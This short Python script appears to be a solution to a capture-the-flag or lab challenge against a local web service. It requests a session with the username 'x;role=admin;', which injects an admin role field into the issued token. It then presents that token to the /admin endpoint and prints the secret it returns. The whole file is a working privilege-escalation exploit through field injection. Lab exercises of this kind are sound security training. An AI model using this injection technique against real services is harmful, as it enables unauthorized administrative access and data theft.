import json
import urllib.parse
import urllib.request

BASE = "http://127.0.0.1:32774"
NAME = "x;role=admin;"


def request(url, data=None, headers=None):
    req = urllib.request.Request(url, data=data, method='POST' if data is not None else 'GET',
                                 headers=headers or {})
    with urllib.request.urlopen(req) as response:
        return json.loads(response.read())


def main():
    session = request(BASE + '/session?user=' + urllib.parse.quote(NAME))
    token = session['token_hex']
    admin = request(BASE + '/admin', data=b'', headers={'X-Token': token})
    print(json.dumps({"secret_hex": admin['secret_hex']}, sort_keys=True))


main()
